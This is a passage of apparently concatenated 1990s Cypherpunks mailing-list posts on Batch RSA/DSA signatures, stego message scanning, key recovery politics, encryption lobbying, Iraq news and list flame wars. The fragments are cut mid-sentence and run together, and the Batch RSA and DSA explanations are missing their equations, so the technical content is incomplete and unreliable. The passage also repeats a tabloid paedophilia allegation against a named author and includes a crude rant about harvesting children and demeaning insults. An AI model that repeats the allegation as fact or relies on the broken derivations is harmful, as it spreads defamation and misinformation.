he mentioned setting up a dedicated target for the DES challenge.  I think a
similar scenario would also be an effective tool for ECD for testing support
as well as being an alternate site since some target sites could be ominious
enough to keep supporters at bay and a guinea pig site with full logging
could be used to gather data to present to the media directly instead of to
the media through a target site.
I'd rather not get into a lengthy arguement about the legality of the above
or whether it can be implemented since judging from the result of some of
the last calls to protest within this group I don't think this type of
action will see a real implementation anytime soon so it's legality and
feasibility would be mostly speculation IMHO.  I just wanted to clarify what
I had in mind as option c) in the original mailing.
It's late and there's a bunch of good jazz happening the next two nights at
the Mercury Lounge in downtown Austin.  The crypto revolution will have to
wait for a less festive time of year :-)...

You clearly don't run a website. Logs are very valuable. Any admin
who doesn't have space for at least several days of normal traffic
available on their logging device is simply not doing a good job.
A network admin running a website doesn't lose logs - careers live

many instances of some sort of odd political commentary", that could
have an effect. It could throw off reporting and make a new conversation
topic for editors, which might, if you managed to organize enough
people, earn you a CNET story. "CyberActivists Make An Obtuse

As a further clarification, it is incorrect to say that NAI "never left
the KRA."
Network Associates Inc. (NAI) was formed out of McAfee and Network
General.  McAfee was a member of the KRA, so at the time NAI was formed,
it was a member of the KRA.
When NAI bought PGP, in late 1997, Phil Zimmermann found out about NAI's
membership, and he was able to persuade management to withdraw from
the KRA.  This is why it is wrong to say that NAI never left the KRA.
See NAI bought TIS a few months later.  TIS was a member and in fact a leading
member of the KRA.  By purchasing TIS, NAI inherited its membership in
the KRA, and so NAI was once again a member.
It's not clear whether Phil Zimmermann or anyone else tried to get NAI to
again withdraw from the KRA, but if they did, they were not successful.
NAI renewed its membership later in 1998 and is still a member of the KRA,
although it has reduced its level of participation.

This sounds like some legalistic spin-doctoring from the KRA to try to
minimize the political impact of the departure.  Are they really claiming
that the KRA did not exist as late as December, 1997?  See their own press
release at  dated October 2,
1996, describing the formation of the KRA.  See also the McAfee press
release at  dated
December 12, 1996, saying that McAfee was joining the KRA, and the KRA
press release  from May, 1997,
welcoming 22 new members.
Perhaps their story is that prior to December, 1997, the KRA had enough
existence for companies to join, but not enough for them to withdraw?
Keep in mind that the KRA is apparently trying to put a particular spin
on events, as is clear from their strained attempt to claim that NAI never
withdrew because their was "no entity from which to withdraw."  They want
to maximize the appearance of commercial support for their organization.
The membership applications they are referring to may just be the
paperwork needed to officially transfer the membership from TIS to NAI.
This would represent NAI's decision to continue to be a member of the
KRA but would not be a matter of joining anew; rather it would maintain
the existing relationship inherited from TIS.

McAfee has announced that they are giving away the commercial version of PGP 6.0.2 for free for a limited time.  It also includes PGP Disk, which creates virtual encrypted drives.  PGP 6.0.2 also claims to have anti-TEMPEST protection, by using a special font.  My question is: what's the catch?
It is a fact that Network Associates (McAfee's owner) is a member of the Key Recovery Aliance.  Is the decision to give the software away part of something that's not being said (i.e. reduced security) or did I spend $39.99 on PGP and an additional $39.99 on PGP Disk for no reason because it would become available for free two weeks later?
And, has anyone tested the anti-TEMPEST features in PGP 6.0.2?

To clarify exactly why this is a problem: although it obviously won't affect
the security of existing apps, it's likely that many newer apps will be
dependent on this possibly-secret firmware for security, and we all know the
evils of depending on a design not subject to intense public scrutiny. Worse
yet, it seems possible that a certificate-based system could be used to ensure
that neither non-Intel chips nor software fill-ins would be accepted by
applications using the firmware.
And, of course, except for what was mentioned in the TechWeb article itself,
this is all conjecture based almost entirely on Murphy's Law.

hub'd be backdoored because it'd be a risky investment for anybody to backdoor
it; although I'm not sure the hub'd be closed-source, anything trivially and

ACLU: Bombing in Iraq Violates
     Constitution and War Powers Act
FOR IMMEDIATE RELEASE
Thursday, December 17, 1998
WASHINGTON -- The American Civil Liberties Union said today that the
bombing of Iraq ordered by President Clinton violates the Constitution
and the War Powers Act because it was not authorized by Congress.
Congress adopted the War Powers Act in 1973 to ensure that U.S. troops
are not sent into hostilities without Congressional authorization,
except in cases where a national emergency is created by attack upon the
United States.
"Launching a massive, sustained military assault is an action that no
one person in our democracy -- including the President -- can
authorize," said ACLU Legislative Counsel Gregory T. Nojeim, adding that
the ACLU takes no position on the use in force in Iraq.
"It is a power that the framers contemplated would be shared by Congress
and the President," Nojeim added, noting that Article I, Section 8,
Clause 11 of the Constitution grants to Congress "the power to declare
war [and] grant letters of marque and reprisal."
Under the Constitution, Congress is given the ultimate decision as to
whether to use force; the President's power is limited to decisions on
how to use the military after Congress has authorized the President to
Section 2(c) of the War Powers Act states that the President has
constitutional authority to "introduce United States Armed Forces into
hostilities, or into situations where imminent involvement in
hostilities is clearly indicated by the circumstances, ... only pursuant
to (1) a declaration of war, (2) specific statutory authorization, or
(3) a national emergency created by an attack upon the United States.
"A debate and vote on the use of force is especially important here,
since many members of Congress have publicly expressed reservations
about the timing of the attack, and Congressional resolutions have been
introduced about the use of force in Iraq," Nojeim said.
One of those resolutions expressed the sense of Congress that the United
States should not take military action against Iraq unless that action
was first authorized by Congress. That resolution, H. Con. Res. 226, was
introduced in February 1998, gathered 108 co-sponsors, but was never
voted on by the full House.
The ACLU said that the resolution that was adopted by the House today,
H. Res. 612, does not meet the requirements of the War Powers Act, and
that the Iraq Liberation Act, which was adopted by Congress and signed
by the President in October, did not authorize the use of U.S. forces in
"A debate would help ensure that all viewpoints on this important issue
are considered," Nojeim said, "and a vote ensures that such an important
decision has been endorsed by the people through their representatives
in Congress."

Good idea!
This could be done via some of the recent work on group signatures.
Efficient methods have been developed to show that a message is signed
by a key, without revealing what the key is, but proving that the key
itself is signed by a specific other key.
Imagine an editor who only signs keys belonging to people who deserve
to get through filters.  Call this "endorsing" a key.  If you respect
that editor, you set your filters to let messages through which are by
keys he has endorsed in this manner.  Now, people can submit messages
anonymously, but in such a way that they are provably written by an
endorsed key, without revealing which key it is.
The protocols are reasonably efficient, with signature verification taking
about 20 times longer than a regular DSS signature.  However the methods
involve blind signatures, and hence would infringe upon Chaum's patent.
The group signature was described at Crypto 97; an extension for blind
group signatures at Asiacrypt 98; and more work will be presented at
FC 99.

 Pentagon Decries U.S. Bomb Graffiti Tuesday, December 22, 1998; 1:24 a.m. EST
WASHINGTON (AP) -- Defense Department officials said Monday they were
distressed about ``thoughtless graffiti'' referring to the Islamic holy
month of Ramadan on a Navy bomb being prepared for dropping on Iraq. The Associated Press last Saturday transmitted a photograph of a
2,000-pound laser-guided bomb on the aircraft carrier USS Enterprise in the
Persian Gulf waiting to be loaded on F-14 and F-18 jet fighters. The bomb bore several inscriptions, including one that said, ``Here's a
Ramadan present from Chad Rickenberg.'' ``Department of Defense officials were distressed to learn of thoughtless
graffiti mentioning the holy month of Ramadan written on a piece of U.S.
ordnance during Operation Desert Fox'' in Iraq, chief Pentagon spokesman
Kenneth Bacon said in a statement. ``Religious intolerance is an anathema to Secretary of Defense William S.
Cohen and to all Americans who cherish the right to worship freely,'' he
added. ``The United States deeply respects Islam. We are grateful for our
good relations with Arab and Islamic peoples, and we appreciate the
important contributions of Muslim-Americans to the U.S. military and to our
nation as a whole. ``I know our people in uniform respect and appreciate religious practices
different from their own. This incident is a rare exception that does not
reflect American policy or values.''

Executive Summary According to Secretary of State Madeleine Albright, terrorism is the most
important threat the United States and the world face as the 21st century
begins. High-level U.S. officials have  acknowledged that terrorists are now
more likely to be able to obtain and use nuclear, chemical, and biological
weapons than ever before. Yet most attention has been focused on combating terrorism by deterring and
disrupting it beforehand and retaliating against it after the fact. Less
attention has been paid to what motivates terrorists to launch attacks.
According to the Pentagon's Defense Science Board, a strong correlation
exists between U.S. involvement in international situations and an increase
in terrorist attacks against the United States. President Clinton has also
acknowledged that link. The board, however, has provided no empirical data
to support its conclusion. This paper fills that gap by citing many examples
of terrorist attacks on the United States in retaliation for U.S.
intervention overseas.  The numerous incidents cataloged suggest that the
United States could reduce the chances of such devastating--and potentially
catastrophic--terrorist attacks by adopting a policy of military restraint
overseas. In fact, the interventionist foreign policy currently pursued by the United
States is an aberration in its history. Adopting a policy of military
restraint would return the United States to the traditional foreign policy
it pursued for the first century and a half of its existence before the Cold
War distorted it. Such a foreign policy is more compatible with the

No, it's stealing. The government doesn't call the Waco incident
murder, but that doesn't make it okay. 1) Yes, but at least the person sending it paid for it. It doesn't
consume any resources from the recipient, other than mailbox space
which the government claims it owns anyway. The postal service has to store and deliver it, but they got paid for it. When you get it,
you're perfectly free to cram it back in the outgoing mail slot like I
2) They steal time and they're very annoying, but they don't steal
money per se. If they're long distance the caller pays for it. Most
people are annoyed by these. The anti-phone-soliciting action is to
never buy from those companies.
3) Taxes are theft at the point of a gun. You won't find much argument
about that here. There will be argument when it comes to the complete
elimination of taxes because that generally means the almost complete
elimination of services.
4) Of course it is.
Just because all four of those things are legal in one way or another
doesn't mean that we should support it. I can walk outside and insult
random people to their face, but that dosen't mean I should.
Just because you *can* do something and you have some reason to do
something doesn't mean that you *should* do it, particularly if there
are better ways.
The phrasing has nothing to do with it. The method of delivery does.
Apparently this is beyond your comprehension, so I'll explain it in
explicit terms.
You will likely direct people to FIJA. First off, when you send the
spam FIJA and their upstream sites are going to get all sorts of
complaints, and rightly so. The site it originates from will also get
flooded. Assuming FIJA is still online a few hours later, they will
probably wind up on spam block lists.
If you spam through anonymous remailers, they'll wind up on spam
blocking lists all over the place. If you falsify an origin address, it will also get flooded with complaints. Even mentioning FIJA is going to get them flooded with complaints.
You also make the mistake of assuming that most people read spam. They
don't. It just annoys them.
If you spam through anonymous remailers, you further the theories of
some people that they are simply abuse havens. This is not a positive
thing for the remailers. The Cypherpunks are associated with the
remailers, so it isn't a positive thing for us either, even though
we'll only be implicated several steps down. If such tactics are fair, then why are we worrying about distributing
FIJA literature? The government has our best interests at heart, after
all. Whatever.
The best thing to do "for the children" is to kick the clueless masses
off the Internet and turn it back into the academic area it used to
be. Good has come out of the commercialization of the Internet, but by
no means does it outweigh the bad.
The best thing to do "for future generations" is to revoke the voting
rights of welfare maggots. I don't see it happening very soon.
Or for good to use the means of the evil to express their good ideas,
in the process becoming the very thing they are fighting against.
Make a web site. Put it in your signature. Have others put it in their
signatures. Have people link to it from their pages. Advertise in
*appropriate* forums in appropriate manners.
It's threads like this that make me wonder what it really means to be
a Cypherpunk today. If the Cypherpunks (in the democratic sense)
actually support this, it is a sad day indeed.
As far as I'm concerned, go ahead and spam. You'll probably make FIJA
look like idiots, get some anonymous remailer sites shut down if you
spam through them, screw over any site even remotely mentioned in the
spam, get us blasted all over the abuse forums because it has been
discussed here recently, and accomplish the exact opposite of our goals. But go ahead if that's what makes you feel better.

The "topologically close" tradeoff (i.e, a gain in performance for an

yes, I found that out in the meantime. the legal aspect falls short

it probably needs extension before it's really useful, so I have put

Arthur C Clarke sex scandal hits Charles's Sri Lanka visit
by Yvonne Ridley
 THE Prince of Wales's visit to Sri Lanka
 this week hit a new problem last night
 after Arthur C Clarke, the respected
 science fiction writer due to be knighted
 by Charles, allegedly confessed to being a
 paedophile.
 The investiture is due to take place on
 Wednesday during the prince's visit, which
 coincides with the celebrations for the
 50th anniversary of the island's
 independence.
 Downing Street said last night: "As far as
 we are concerned the investiture is still
 going ahead as planned." A spokesman
 refused to comment on the possibility of a
 forfeiture of the honour by the 80-year-old
 author of 2001: A Space Odyssey.
 Clarke's revelations, published in today's
 Sunday Mirror, are bound to embarrass
 Tony Blair, who named him in his first
 new year honours as prime minister.
 Last night diplomats in Colombo, the
 island's capital, were being asked to assess
 the author's tabloid confession. If the
 report is taken at face value the ceremony
 is unlikely to go ahead.
 Buckingham Palace advisers contacted
 British embassy officials in Sri Lanka this
 year to make discreet inquiries after
 rumours about Clarke's sexuality and
 private life.
 They reported that, although Clarke was
 known to be gay, there was no evidence of
 paedophilia.
 The British-born author of more than 80
 novels, who has adopted Sri Lanka as his
 home, was unable to travel to Britain to
 receive his knighthood from the Queen
 because he is virtually confined to a
 wheelchair as a result of post-polio
 syndrome.
 In 1989 he was made a CBE for his
 services to British cultural interests in Sri
 Lanka, where he enjoys a tax-free lifestyle
 bestowed on him by the island because of
 his celebrity status.
 He previously met Charles at the British
 premiere of his Odyssey film in the 1960s,
 for which he received an Oscar
 nomination.
 Surrey-born Clarke was married briefly in
 1953 to Marilyn Mayfield, an American
 who has since died. The marriage lasted
 about six months after a whirlwind affair.
 After the split Clarke moved to Sri Lanka,
 where he now lives in a luxurious home
 surrounded by state-of-the-art technology
 and computers that allow him to keep in
 touch with friends around the world.
 His study is lined with photographs of
 celebrities and admirers of his work,
 including the Pope, Diana, Princess of
 Wales, Elizabeth Taylor and the astronaut
 Neil Armstrong.
 The news also threatens to cast a shadow
 during the royal visit for senior officials
 on the island as they have always been
 proud of the eminent author's presence
 during the past 40 years. Homosexuality is
 regarded as an offence in Sri Lanka and
 carries a prison sentence of up to 10 years.
 Charles's planned trip was already marred
 last week by a terrorist attack on a temple
 that was to have been the scene of the
 independence celebrations.
 The bomb killed 17 people, including a
 suicide team who drove a truck into the
 old hill capital of Kandy.
 Buddhist leaders have called for a boycott
 of this week's ceremonies in protest at
 Charles's presence. They say Britain
 sympathises with the island's separatist
 Tamil Tiger rebels. They also claim the
 Tamil Tigers, who carried out the
 bombing, have been allowed to raise
 money in London for terrorist campaigns.
 Since the bombing some Buddhist leaders
 have intensified demands for a formal
 apology from Britain for its colonial rule.
 A Foreign Office spokesman said last
 night that he fully expected Charles's visit
 to Sri Lanka to go ahead despite the
 security fears over recent terrorist
 activities.
 A report that members of the prince's royal
 protection squad would not be allowed to
 carry guns was an "administrative point"
 that would be resolved before the party
 left, he said.
 "It is an island where there is a history of
 terrorist problems with the Tamil Tigers
 and, from time to time, with explosions
 and so forth, so not unnaturally we are
 looking very closely at security," the
 spokesman said.

Ironically, the reglations may be their own undoing here.  It seems most

Easier said than done.
Designing digital cash software is easy.  (Several prototypes exist.)
Getting people to accept it as having value is not.
But let's suppose that we build a complete fault-tolerant digital cash
system with multiply-redunant servers all over the world, and you can sit
at your computer and trade crypto-credits with whoever you want.
You've got a small fortune worth of e$.  What are you going to buy with it?
Are you going to buy groceries at the local supermarket with cypherbucks?
I doubt it.  Surely you can't use the system to pay for your house or car,
or other government-traceable assets.  And certainly not airline tickets.
Perhaps you could buy a new computer.  That would work, if you could
arrange delivery anonymously (which I doubt).  Or maybe you could pick it
up in person, but you don't need e-cash for that.
About the only practical thing you could buy would be a pre-paid phone
card.  Anything else, you'd need to arrange delivery for, and if you can
have contraband mailed to you, then you can have other things that you
don't want sent to you.
The problem is not digital cash.  The problem is delivering the goods
bought with it.  Solve the delivery problem and digital cash will follow.

@_subject: Software Reverse Engineering 
Hi All -
I've recently been disassembling some software written by idiots who never
heard of operating systems other than messy-windows, so that I can
re-implement it on my favorite platform (and fix numerous bugs).
I know many of you have done work in this area so maybe you can give me a
few tips.
I ran the program and traced its execution, which quickly showed what parts
were significant, and it's pretty easy to figure out what the relevant
functions are and what they do.  I was able to recompile sections of the
code into my own program and make it work without too much difficulty.
What is bugging me is this:  The program contains huge amounts of 'junk code' such as the following (disassembled with gdb):
     movl   0x7c58c,%eax
     movl   %eax,0xffffffa8(%ebp)
     movl   0xffffffa8(%ebp),%eax
     movl   %eax,0x7c590
     movl   0x7c590,%eax
     movl   %eax,0xffffffa8(%ebp)
     movl   0xffffffa8(%ebp),%edx
This segment of code accomplishes nothing execpt to move the same value
around into different locations, which are never again read.  At least
half of the instructions consist of similiar garbage, writing data into
locations that are never read, duplicating constants, copying values that
are never used, and so on.  The only thing saving the program from
running out of memory is that the programmer mostly used static buffers,
only sparingly doing dynamic allocation.  I'm quite surprised that I
haven't found any buffer overruns or security holes yet.
So, does anyone have reccomendations of what is the best way to seperate
the wheat from the chaff, so to speak?  I can use the program as is, but
the sheer amount of junk tends to make it run slowly, so I'd much prefer
to completely rewrite it.

Despite inexplicable rumors and propaganda about independence

New York's, fingerprints at driver license renewal time,
roadblocks to fish for people who have been indulging in
adult beverages or who have outstanding warrants, and some
of the most dumb-fuck, clueless, fuckwit people behind
badges in the known universe. Texans will give anyone
their SS number at any time for any reason. Many print it

The only reason it isn't on the bleeding foreskin of
Big Brother technology is that there aren't enough clues

them stumbling over dangerous or disturbing information.  Like it or not,
many parents are very protective of their children.  We have no right
to force our own views of childrearing on them.
The filtering companies are filling a legitimate need in the marketplace.
They are not evil and they are not trying to prevent adults from viewing
the material they desire via their own personal accounts.  They give
concerned parents a sense of safety in allowing their children to use
the internet, and in that way allow young people access to the net who
would not otherwise be allowed to use it.

Congressional Record: February 5, 1998 (House)
                   ELECTRONIC CAMPAIGN DISCLOSURE ACT
  (Mr. WHITE asked and was given permission to address the House for 1   Mr. WHITE. Madam Speaker, in March we are going to vote on campaign finance reform in this House. It is a very important issue but also a very difficult issue, and it is made particularly difficult because most of the bills before us are big bills that deal with the whole comprehensive issue that we have to talk about.
  I have got one of those bills, and I hope that we can pass one. But just in case we cannot, today I am introducing what we might call a small bill that will deal at least with some of the problems. This bill is called the Electronic Campaign Disclosure Act, and what it does is tell the Federal Elections Commission to get into the 21st century.
  It directs the FEC to establish a database on-line to search over the Internet for all the information needed about campaign finances in our country. Every campaign would have to file within 10 days a report of every contribution that it receives and contributors, and PACs would also have to file.
  Madam Speaker, sometimes we cannot do it all in one step. The longest journey begins with a single step, and I think if we cannot pass a big bill a small bill like the one I am introducing today would be a step in the right direction.

Actually, thanks to NAFTA, the Mexicans can drive without citizenship
papers, and they don't have to give the California DMV shit.  All they
need is a valid mexican driver license and they can drive in the US.

@_subject: What Jim Choate doesn't know 
When Jim Choate writes about something that I know about, he is usually
wrong.  Look at the hash he made of quantum mechanics recently.  And don't
get me started on his blunders regarding cryptography.
So when he writes about something I don't know about, like the EM
emissions of video tubes, I tend to assume the same thing.  He's probably
all messed up.
Anybody else have the same experience?
And how about his countless off-topic posts, forwarding all kinds of
pointless crap?  Is anyone else sick of that, too?

Who are the "digerati" and why are they "the
cyber elite"? They are the doers, thinkers, and
writers who have tremendous influence on the
emerging communication revolution. They are
not on the frontier, they are the frontier.
The digerati evangelize, connect people, adapt quickly.
They like to talk with their peers because it forces them
to go to the top of their form and explain their most
interesting new ideas. They give each other permission
to be great. That's who they want to talk to about the
things they are excited about because they want to see if
it plays. They ask each other the questions they are
asking themselves, and that's part of what makes this
cyber elite work.

Death of a Legend / The Truth About the CypherPunks:
The CypherPunks have long been renowned as standing at the bleeding edge the burdgeoning computer technology which is rapidly changing the face of our
planet and the governmental, civil, and social societies encompassed this celestial orb.
Harbingers of the Digital Future / Pioneers of Future Technology / etc., The CypherPunks are rag-tag band of infantile, pseudo-anarchistic, cryptic, well-educated shit-disturbers who take great pleasure in pissing on
themselves, each other, and the world around them--all the while, their motivations and ambitions with high-sounding ideals intended to the fact that none of them ever received proper toilet-training.
The end result?
No matter how high they pile it, how far they spread it, or how badly it smells when you step in it, they end up coming off as the Henry of CyberSpace, because no matter how much rotten meat, jalapenos and cheese they eat, they can never manage to crap out anything so vile and smelling that the world-at-large cannot prove prophetic in MeatSpace.

Tim May is spot on about the feral kid. Yet, battering the clone bruises the produce and harms sales.
Kids are over-coddled species and that's the cause of the rise in black market of kiddie porn, kidnapping, rape, incest and murder, what with crazed adults (parents and wannabes) wanting to develop for home domination hyper-valued Benets, since they're worth more on the market as icons than as needy brats begging for affection and attention, and interfering with dad and mom getting on with maximum self-indulgence.
And there's way too many kids, anyhow, the market's saturated. Especially those over the age of adorable cuddling and grandma gaga for adverts. Harvest all over the age of two, say, when they become unruly, as the Brit pedophagist proposed for the Irish surplus to solve the famine. Shut the day cares, schools, colleges,
boot camps for homicidals. Unplug the Net for those under 30,
they're more socially useful as protein, as anciently preached

Exactly. As far as I'm concerned, if the "educators" act physically
theatening towards any student then the student is perfectly within his or
her rights to beat the living shit out of the "teacher." It's classic. The government has a monopoly on violence, even in schools. If
an "educator" beats up a student it's "discipline." If a student beats up
another student it's a "boys will be boys" situation which gets a slap on
the hand. But a student better not touch an "educator" or all kinds of hell
will rain down on them, including expulsion from a facility they have to pay
for anyway, and criminal charges.
There was a situation much like this in Texas a while back that I heard about.

I hope that this isn't too American for us the majority on this list.  I
thought that it was relevant.
See original webpage for hyperlinks.
  Group to Attack Clinton on Crypto
  By Courtney Macavinta
  Staff Writer, CNET NEWS.COM
  February 23, 1998, 2:40 p.m. PT   A bipartisan group of politicos, high-tech companies,
  and privacy advocates will announce a broad coalition
  next week to overturn the White House's current
  encryption policy through a million-dollar media blitz
  and lobbying campaign, CNET's NEWS.COM has
  learned.
  Encryption secures digital communications, rendering
  it unreadable if intercepted. The technology is the
  center of a U.S. debate with federal law enforcement
  officials asking Congress for access to the "keys" that
  unlock encrypted data on one side, and consumer
  groups and industry representatives arguing that such
  provisions make encryption products useless and
  constitute an invasion of privacy.
  The formation of the coalition--Americans for
  Computer Privacy--signals a shift in the diligent, but
  Beltway-confined, fight against the White House's
  crypto stance. The players in the coalition will
  attempt to force encryption policy on the mainstream
  radar by convincing Americans that the government
  has plans to read their private digital discourse.
  "This will be an effort with very major financial
  backing, and this effort will be joined by a
  breathtaking coalition of interests," Jack Quinn, the
  coalition's legal adviser, told CNET's NEWS.COM
  today. Quinn is a senior partner with Arnold &
  Porter in Washington and is a former counsel to
  President Clinton.   "I think people will understand that the FBI director's
  [Louis Freeh] proposal for domestic encryption
  controls is really like asking them to make a duplicate
  of their front door key and leave it at the post office
  in case he wants to get inside...I don't think it will be
  hard to explain," he added.
  The coalition includes the Business Software Alliance,
  which will be just one of the financial backers, the
  trade group confirmed today. The hired guns to head
  up the coalition's strategy and media campaign also
  include Ed Gillespie, president of Policy Impact
  Communications and the strategist behind the
  Republican's sweeping 1994 legislative package
  known as the Contract with America; and the firm of
  Goddard-Claussen, which is best known for creating
  the famous "Harry and Louise" commercials that
  helped defeat the president's health care reform
  initiative the same year.
  In addition, Mindshare Internet Campaigns will be in
  charge of the online strategy and Web site for the
  coalition, with the Dittus Group in charge of public
  relations. Recruiting pamphlets with scant details
  about the coalition's membership, but with clearly
  laid out goals, already were circulated at the
  Computers, Freedom, and Privacy conference in
  Austin, Texas, last week.
  These forces and other yet-to-be named members of
  the coalition will try in about 50 calendar days
  remaining in Congress's session to derail legislation
  already on the table that they say will prevent private
  online communication.
  The group will fight an FBI-backed plan that would
  require all federally funded computers to store
  encryption keys with a government-approved party,
  allowing law enforcement to unscramble documents
  without users' knowledge or even a court order in
  some cases.
  "Even if you don't have a PC at your home or office,
  still there is information about you that is
  computerized; maybe it's your medical or financial
  records. We want to make sure that the technology
  that can keep that information private stays that way,"
  said Tom McMahon, a spokesman for the coalition,
  which officially will launch next Wednesday.
  In addition, the Americans for Computer Privacy will
  ramp up an ongoing battle to overturn Clinton
  administration regulations prohibiting the export of
  strong encryption products unless the codes are made
  available to law enforcement agencies. A bill know as
  the SAFE Act was the vehicle for this export relief,
  but at least one version of the bill altered by the
  House Intelligence Committee would grant law
  enforcement access to encrypted protected
  communication in the United States. (See related
  story)
  "BSA is involved in this broader coalition of users,
  industry, and privacy groups. We are coming
  together to push for a policy that is based on a
  voluntary, market-based system that is based on
  consumer demand vs. the government's demand to
  access your communication in a way that is
  unprecedented and violates privacy," said Kim
  Willard, a spokeswoman for the BSA.
  The media campaign is expected to cost more than $1
  million and will continue over the next eight months.
  The goal is to stimulate grassroots action against the
  bills that add more controls on cryptography. At the
  same time, the coalition's political heavyweights will
  be working with Congress members to secure a
  victory.
  "They clearly want to get this out to broader public
  audiences and move outside the Beltway to focus on
  what the public has at stake in this the debate," said
  Richard Claussen, whose firm will work on the TV
  campaign. "The indication is that we want to move
  pretty aggressively on this."

@_subject: Fiat's Batch RSA 
Batch RSA
invented by Amos Fiat
Described in Crypto 89 and J Cryptology 1997.
RSA works as follows.  The key owner chooses two secret primes p and q,
and forms their product n = p*q.  He then chooses a public exponent e
relatively prime to p-1 and q-1.  His public key is (n, e).
To encrypt a message m into cyphertext c, m is raised to the power e, mod
n: c = m^e mod n.  To decrypt the message, the key holder calculates d
as the multiplicative inverse of e mod (p-1)(q-1): d = 1/e mod (p-1)(q-1).
He recovers m from m = c^d mod n.
For simplicity, below we will write this as m = c^(1/e) mod n, where it
is understood that the 1/e is done mod (p-1)(q-1).
An RSA signature s on a message m is calculated as for a decryption:
s = m^(1/e) mod n.  The signature is verified by m ?=? s^e mod n.
The time consuming part of an RSA decryption or signature is this
exponentiation step.  e can be chosen to be small, so encryption and
verification is fast, but 1/e will generally be about the same size as n,
so many multiplications must be done to raise a number to that power.
Amos Fiat describes a method whereby multiple messages can be decrypted
or signed using only one full-sized exponentiation.  The "catch" is that
the messages must all use different exponents with the same n.
Here is a concrete example.  You want to decrypt or sign two messages,
M1 and M2, raising M1 to the 1/3 power and M2 to the 1/5 power.  Perform
the following steps:
This is the only full-sized exponentiation needed.  This gives:
This is the product of the two values that we want.  Fiat uses a trick
to disentangle the two values.  He raises I12 to the 6th power.  The
number 6 is chosen so that it is a multiple of one of the two
exponents, 3, and is 1 more than a multiple of the other exponent, 5:
which is one of the values we need.  Since I12 is the product of the two
values we want, we can recover the other value just by dividing this into
Here is another example.  Suppose we want M3^(1/7) and M4^(1/11).  (Note
that we are using prime numbers for the exponents; the reason will be
explained below.)  We calculate:
This gives us:
Again this is the product of the two values we want.  As before we will
raise this to a power which is 1 more than a multiple of one of the two
exponents (7 and 11) and is a multiple of the other one.  The smallest
such power is 22.
So we can divide to get M3^(1/7):
And we can divide to get the other value needed:
This illustrates how to derive two RSA roots using only one full sized
exponentiation.  A few small exponentiations are also needed, as well
as two divisions, but these are much faster than doing the full
exponentiation (raising to the 1/15 or 1/77 powers above).
Fiat's idea can then be applied recursively.  Note that in the examples
above we had to take two full-sized exponentiation, M12 to the 1/15 power
and M34 to the 1/77 power.  We can combine both of these exponentiations
into one just as was done above:
the product of the two values we want.  We need an exponent which is
1 more than a multiple of 15 while being a multiple of 77, giving
615, or vice versa, giving 540.  Choosing the latter since it is smaller
we have:
and dividing gives the other factor:
These values can then be fed into the expressions above to recover
M1^(1/3) and the other three values, all with only one full-sized
exponentiation for the four messages.
In general, finding the exponent for Ixx can be handled by the Chinese
Remainder Theorem.  However it requires that the two values be
relatively prime.  That is why the exponents used in Batch RSA must
all be relatively prime, so that there is a solution to the value of
the exponent for Ixx.
As the number of values in the batch increases, the "small" exponents
needed to recover the values increase as well.  We saw above that the
exponents went from 6 and 22 for the size-two batches to 540 for the
size-four batch.  This means that you reach a point of diminishing
returns where increasing the batch size no longer provides much
benefit.  Fiat suggests a batch size of n/(log^2 n) messages, where n
is the length of the full-sized exponentiation (e.g. 1000 for a 1000
bit modulus).  This would correspond to about a 10 message batch for
a 1024 bit key.
Fiat describes a few situations where it may be appropriate to use
different exponents for multiple RSA operations.  In the case of a
server issuing multiple RSA signatures it could define its public key
to be (n, e1, e2, e3,...) and specify that the signature was valid for
any exponent in the list.  Then it could batch up signatures and use a
different exponent for each one.
Another case is "pure RSA" encryption, where the message itself is broken
into blocks and each one is RSA encrypted.  In that case the blocks could
use successive exponents from the list, and the receiver could decrypt
a batch of blocks using one large exponentiation.
There is another case of interest to us, related to the task of
searching through messages from a message pool, possibly
steganographically hidden.  That will be described in another message.

Under The Communications Decency Act S.230(a) no service provider is liable for content authored by others.

There is absolute no reason for being concerned about defamation from the operator point of view.

@_subject: Batch DSA 
Batch DSA
Amos Fiat invented a way to do multiple RSA signatures using only one
full-sized exponentiation [J Cryptology v10 n2 p75].  The trick is to
sign each one with a different RSA key, where the keys all share the
same modulus n but differ in their public exponents e.
A similar technique allows DSA signatures to be batched.  As with
Batch RSA, each message ends up being signed with a different DSA key,
where the keys share the same p, q, and g values, but differ in their
public y values, where y = g^x mod p for a secret x.
These techniques may be useful for situations where heavily loaded servers
need to digitally sign many responses.
A DSA signature on a message M (where M is the hash of the actual data)
is done as follows:
Then (R, S) is the signature.
The time consuming part of this is the calculation of g^k.  This is the
only exponentiation which must be done.  All the other calculations can
be very fast.
We can't re-use a k value because it allows x to be discovered very
easily.  If two signatures (R, S_1) and (R, S_2) use the same k value,
we have (mod q):
The capitalized values are known, the lower case k and x are the unknowns.
We have two equations in two unknowns, which allows us to recover k and x.
If different x values are used for each signature, then it should be safe
to re-use k.  This is how Batch DSA would work.
The signer would publish his public key as p, q, and g as usual, but now
he would publish multiple y_i = g^x_i values.  The convention is that
any message is considered signed by the key if it is signed by any of the
To sign a batch of messages, one k value is used for all of them.  The
same calculation as above is used:
The signature is (R, S_i, i), where the index i is included to tell the
verifier which y_i to use.
This is not vulnerable to the problem above of re-using k.  The multiple
signatures have the relationships:
We always have more unknowns than there are equations, which hides the
values of k and x_i.
This same technique can be applied to most other discrete log signatures,
which generally have the same structure although they differ in the details
of how x and k are used to construct R and S.
With Batch RSA, there is a tradeoff between batch size and efficiency.
The calculations become inefficient for batch sizes larger than tens
of messages when keys are about 1K bits.
Batch DSA can efficiently handle larger batches, but it has a tradeoff
between batch size and key size.  Each key variant requires specifying a
full-sized y value, while with Batch RSA the variants just required
listing a small e value (and possibly not even that, if the exponents
are the small primes).  This will limit Batch DSA in most circumstances
to similar batch sizes of on the order of tens of messages, otherwise
the keys become unreasonably large.

@_subject: Batch RSA for stego data 
Problem: Suppose there is a source of data which looks like random noise
but which contains embedded messages.  This may be a subliminal channel
in a crypto protocol, steganographically embedded data, or even a simple
message pool where you want to disguise what key each message is for.
How do you scan and identify messages for you?
Solution: Extract bits as appropraite, apply whatever selection rules
are necessary to pull them out of the stego'd data or other source.
Some fraction of what results is messages for you, the remainder is
noise or messages for someone else, which will be indistinguishable.
Method 1: For finding messages sent by someone you have communicated
with previously.  Use shared secret data to flag the message.
Method 1A: each time you send a message, include (in the encrypted
portion) a 64-bit random value which will be used to flag the next
message to them.  Prepend the encrypted message with the 64 bit random
value from the previous message.  Each person keeps a list of the next
random value to be expected from each communicant.  The extracted data
can be easily scanned to see if it matches anything on the list.
Method 1B: use shared secret data and a sequence number to calculate a
hash which will be used to flag the next message sent.  This can be
